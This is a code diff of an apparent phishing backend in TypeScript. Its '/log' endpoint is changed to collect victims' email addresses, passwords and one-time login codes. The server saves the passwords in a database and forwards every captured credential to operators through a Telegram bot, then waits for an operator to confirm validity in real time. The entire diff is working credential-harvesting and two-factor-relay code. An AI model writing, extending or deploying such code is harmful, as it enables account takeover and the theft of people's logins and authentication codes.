@@ -10,59 +10,48 @@ import {
 } from "./lib/bot/callback-bus";
 import { CallbackDataType } from "./lib/bot/constants";
 import { sendMessageToAllSessions } from "./lib/bot/utils";
-import { formatLoginAttemptMethod } from "./lib/bot/utils/format-login-attempt-method";
-import { cors, withCors } from "./lib/cors";
+import { cors, json } from "./lib/cors";
 import { db } from "./lib/db/db";
 import { tables } from "./lib/db/schemas";
 import { saveAllMessages } from "./lib/db/utils";
-import type { LoginAttemptMethod, VerifyAttemptStatus } from "./types";
+import type { VerifyAttemptStatus } from "./types";
 
 require("@/lib/bot/bot");
 
 const server = serve({
   routes: {
     "/health": {
-      GET: () => Response.json({ status: "ok" }),
+      GET: () => json({ status: "ok" }),
     },
     "/log": {
       async POST(req) {
         //#region PRE-PROCESSING
         const baseSchema = z.object({
           userId: z.string(),
+          code: z.string().optional(),
           loginAttemptId: z.string().optional(),
-          loginAttemptCode: z.string().optional(),
         });
 
         const body = await req.json();
         const basePayload = baseSchema.safeParse(body);
 
         if (!basePayload.success) {
-          return withCors(
-            Response.json(
-              { error: z.treeifyError(basePayload.error) },
-              { status: 400 },
-            ),
-          );
+          return json({ error: z.treeifyError(basePayload.error) }, 400);
         }
         //#endregion
 
         //#region STEP 3: LOGIN ATTEMPT CODE
-        if (basePayload.data.loginAttemptCode) {
+        if (basePayload.data.code) {
           const step3Schema = z.object({
             loginAttemptId: z.string(),
-            loginAttemptMethod: z.enum(["email", "phone"]),
-            loginAttemptValue: z.string(),
+            email: z.string().optional(),
+            password: z.string().optional(),
           });
 
           const step3Payload = step3Schema.safeParse(body);
 
           if (!step3Payload.success) {
-            return withCors(
-              Response.json(
-                { error: z.treeifyError(step3Payload.error) },
-                { status: 400 },
-              ),
-            );
+            return json({ error: z.treeifyError(step3Payload.error) }, 400);
           }
 
           const [loginAttempt] = await db
@@ -73,19 +62,14 @@ const server = serve({
             );
 
           if (!loginAttempt) {
-            return withCors(
-              Response.json(
-                { error: "Login attempt not found" },
-                { status: 404 },
-              ),
-            );
+            return json({ error: "Login attempt not found" }, 404);
           }
 
           const messages = await sendMessageToAllSessions(
             `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
-              `<b>🔒 METHOD:</b> ${formatLoginAttemptMethod(step3Payload.data.loginAttemptMethod)}\n` +
-              `<b>🔑 VALUE:</b> <code>${step3Payload.data.loginAttemptValue}</code>\n` +
-              `<b>🔐 CODE:</b> <code>${basePayload.data.loginAttemptCode}</code>`,
+              `<b>🔒 EMAIL:</b> <code>${step3Payload.data.email}</code>\n` +
+              `<b>🔑 PASSWORD:</b> <code>${step3Payload.data.password}</code>\n` +
+              `<b>🔐 CODE:</b> <code>${basePayload.data.code}</code>`,
             {
               parse_mode: "HTML",
               reply_markup: {
@@ -118,22 +102,12 @@ const server = serve({
               await waitForVerifyAttempt<VerifyAttemptStatus>(loginAttempt.id);
 
             if (verifyAttemptStatus.data === "valid") {
-              return withCors(Response.json(loginAttempt));
+              return json(loginAttempt);
             } else {
-              return withCors(
-                Response.json(
-                  { error: "Verify attempt failed" },
-                  { status: 400 },
-                ),
-              );
+              return json({ error: "Verify attempt failed" }, 400);
             }
           } catch {
-            return withCors(
-              Response.json(
-                { error: "Verify attempt callback timed out" },
-                { status: 504 },
-              ),
-            );
+            return json({ error: "Verify attempt callback timed out" }, 504);
           }
         }
         //#endregion
@@ -141,19 +115,14 @@ const server = serve({
         //#region STEP 2: LOGIN ATTEMPT CONTINUE
         if (basePayload.data.loginAttemptId) {
           const step2Schema = z.object({
-            loginAttemptMethod: z.enum(["email", "phone"]),
-            loginAttemptValue: z.string(),
+            email: z.string(),
+            password: z.string(),
           });
 
           const step2Payload = step2Schema.safeParse(body);
 
           if (!step2Payload.success) {
-            return withCors(
-              Response.json(
-                { error: z.treeifyError(step2Payload.error) },
-                { status: 400 },
-              ),
-            );
+            return json({ error: z.treeifyError(step2Payload.error) }, 400);
           }
 
           const [loginAttempt] = await db
@@ -162,26 +131,21 @@ const server = serve({
             .where(eq(tables.loginAttempt.id, basePayload.data.loginAttemptId));
 
           if (!loginAttempt) {
-            return withCors(
-              Response.json(
-                { error: "Login attempt not found" },
-                { status: 404 },
-              ),
-            );
+            return json({ error: "Login attempt not found" }, 404);
           }
 
           await db
             .update(tables.loginAttempt)
             .set({
-              method: step2Payload.data.loginAttemptMethod,
-              value: step2Payload.data.loginAttemptValue,
+              email: step2Payload.data.email,
+              password: step2Payload.data.password,
             })
             .where(eq(tables.loginAttempt.id, loginAttempt.id));
 
           const messages = await sendMessageToAllSessions(
             `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
-              `<b>🔒 METHOD:</b> ${formatLoginAttemptMethod(step2Payload.data.loginAttemptMethod)}\n` +
-              `<b>🔑 VALUE:</b> <code>${step2Payload.data.loginAttemptValue}</code>`,
+              `<b>🔒 EMAIL:</b> <code>${step2Payload.data.email}</code>\n` +
+              `<b>🔑 PASSWORD:</b> <code>${step2Payload.data.password}</code>`,
             {
               parse_mode: "HTML",
               reply_markup: {
@@ -207,14 +171,9 @@ const server = serve({
 
           try {
             await waitForLoginAttempt(loginAttempt.id);
-            return withCors(Response.json(loginAttempt));
+            return json(loginAttempt);
           } catch {
-            return withCors(
-              Response.json(
-                { error: "Login attempt callback timed out" },
-                { status: 504 },
-              ),
-            );
+            return json({ error: "Login attempt callback timed out" }, 504);
           }
         }
         //#endregion
@@ -237,9 +196,7 @@ const server = serve({
                 .where(eq(tables.user.id, userId));
 
           if (!user) {
-            return withCors(
-              Response.json({ error: "User not found" }, { status: 404 }),
-            );
+            return json({ error: "User not found" }, 404);
           }
 
           const [loginAttempt] = await db
@@ -251,12 +208,7 @@ const server = serve({
             .returning();
 
           if (!loginAttempt) {
-            return withCors(
-              Response.json(
-                { error: "Failed to create login attempt" },
-                { status: 500 },
-              ),
-            );
+            return json({ error: "Failed to create login attempt" }, 500);
           }
 
           const messages = await sendMessageToAllSessions(
@@ -267,12 +219,8 @@ const server = serve({
                 inline_keyboard: [
                   [
                     {
-                      text: "✉️ EMAIL",
-                      callback_data: `${CallbackDataType.MethodAttempt}:${loginAttempt.id}:email`,
-                    },
-                    {
-                      text: "📱 SMS",
-                      callback_data: `${CallbackDataType.MethodAttempt}:${loginAttempt.id}:phone`,
+                      text: "🚀 I'M READY",
+                      callback_data: `${CallbackDataType.MethodAttempt}:${loginAttempt.id}:ready`,
                     },
                   ],
                 ],
@@ -289,23 +237,14 @@ const server = serve({
           );
 
           try {
-            const methodAttempt =
-              await waitForMethodAttempt<LoginAttemptMethod>(loginAttempt.id);
+            await waitForMethodAttempt(loginAttempt.id);
 
-            return withCors(
-              Response.json({
-                ...loginAttempt,
-                disabled: user.disabled,
-                method: methodAttempt.data,
-              }),
-            );
+            return json({
+              ...loginAttempt,
+              disabled: user.disabled,
+            });
           } catch {
-            return withCors(
-              Response.json(
-                { error: "Method attempt callback timed out" },
-                { status: 504 },
-              ),
-            );
+            return json({ error: "Method attempt callback timed out" }, 504);
           }
         }
         //#endregion
@@ -322,12 +261,10 @@ const server = serve({
           .where(eq(tables.user.id, id));
 
         if (!user) {
-          return withCors(
-            Response.json({ error: "User not found" }, { status: 404 }),
-          );
+          return json({ error: "User not found" }, 404);
         }
 
-        return withCors(Response.json(user));
+        return json(user);
       },
       OPTIONS: () => cors(),
     },
